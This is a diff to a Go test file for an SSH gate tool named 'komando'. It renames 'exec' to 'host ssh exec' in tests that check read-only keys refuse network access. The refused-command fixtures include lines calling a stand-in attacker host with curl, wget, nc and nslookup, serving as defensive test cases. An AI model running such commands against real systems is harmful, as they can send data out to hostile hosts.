@@ -47,12 +47,11 @@ func TestGateNoNetwork(t *testing.T) {
 	const N = "SSH_GATE_NETWORK_REQUIRED"
 	refused := []string{
 		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
-		"exec web --read-only -- curl https://evil.example", "exec web --read-only -- uptime",
-		"x web --read-only -- nslookup a.evil.example", "run web --read-only -- wget -qO- evil.example",
-		"exec web --read-only --script -", "exec web --read-only --cmd 'nc evil 1'",
+		"host ssh exec web --read-only -- curl https://evil.example", "host ssh exec web --read-only -- uptime",
+		"host ssh exec web --read-only --script -", "host ssh exec web --read-only --cmd 'nc evil 1'",
 		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
 		"cluster kubernetes exec k8s pod/x --read-only -- ls", "snippet exec my-df web", "snippet exec disk web",
-		"-o json exec web --read-only -- curl https://evil.example", "--dry-run exec web --read-only -- uptime",
+		"-o json host ssh exec web --read-only -- curl https://evil.example", "--dry-run host ssh exec web --read-only -- uptime",
 	}
 	for _, line := range refused {
 		if got := gateKeyAnswer(t, line, readKey); got != N {
@@ -73,13 +72,13 @@ func TestGateNoNetwork(t *testing.T) {
 		}
 	}
 	allowed := []string{
-		"", "list", "version", "status", "ssh-gate status", "test web", "host test web", "logs web --unit nginx",
+		"", "list", "version", "status", "ssh-gate status", "test web", "host ssh test web", "logs web --unit nginx",
 		"fs cat web /etc/hosts", "fs list web /var/log", "docker ps web",
 		"docker logs web app", "database postgres query pg 'select 1'", "db schema pg", "db activity pg", "cache get c a", "cache redis raw c GET a",
 		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
 		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "copy s3:a.txt -",
 		"storage s3 object list s3", "job list", "audit list", "export", "conn test pg", "vpn socks list",
-		"exec --help", "cluster info k8s", "registry oci image list reg",
+		"host ssh exec --help", "cluster info k8s", "registry oci image list reg",
 		"group show web", "group list", "snippet show disk", "snippet list", // a read key keeps the reads of groups and snippets
 	}
 	for _, line := range allowed {
@@ -88,10 +87,10 @@ func TestGateNoNetwork(t *testing.T) {
 		}
 	}
 	// a write is refused as a write first: the hint names --read-only
-	if got := gateKeyAnswer(t, "exec web -- uptime", readKey); got != "SSH_GATE_READ_ONLY" {
-		t.Errorf("exec without --read-only: %q", got)
+	if got := gateKeyAnswer(t, "host ssh exec web -- uptime", readKey); got != "SSH_GATE_READ_ONLY" {
+		t.Errorf("host ssh exec without --read-only: %q", got)
 	}
-	words, _ := gateWords("exec web --read-only -- curl https://evil.example")
+	words, _ := gateWords("host ssh exec web --read-only -- curl https://evil.example")
 	_, _, e := gateCheck(words, readKey)
 	if e == nil || !strings.Contains(e.Hint, "--network") || !strings.Contains(e.Message, "exec") {
 		t.Errorf("refusal: %+v", e)
@@ -160,14 +159,14 @@ func TestGateNoNetworkFailsClosed(t *testing.T) {
 func TestSSHGateNoNetwork(t *testing.T) {
 	invHome(t)
 	gateInventory(t)
-	ran, _, e := gateRun(t, "komando exec web --read-only -- curl https://evil.example/?k=v", "--name", "phone-read", "--read-only")
+	ran, _, e := gateRun(t, "komando host ssh exec web --read-only -- curl https://evil.example/?k=v", "--name", "phone-read", "--read-only")
 	if ran != nil || e == nil || e.Code != "SSH_GATE_NETWORK_REQUIRED" || e.Exit != out.ExitPolicy {
 		t.Fatalf("ran %q, error %+v", ran, e)
 	}
 	if a := lastAudit(t); a["ok"] != false || a["blocked"] != "SSH_GATE_NETWORK_REQUIRED" || a["read_only"] != true || a["network"] != false {
 		t.Errorf("audit %v", a)
 	}
-	ran, _, e = gateRun(t, "komando exec web --read-only -- curl https://example.com", "--name", "phone-net", "--read-only", "--network")
+	ran, _, e = gateRun(t, "komando host ssh exec web --read-only -- curl https://example.com", "--name", "phone-net", "--read-only", "--network")
 	if ran == nil {
 		t.Fatalf("with --network: %+v", e)
 	}
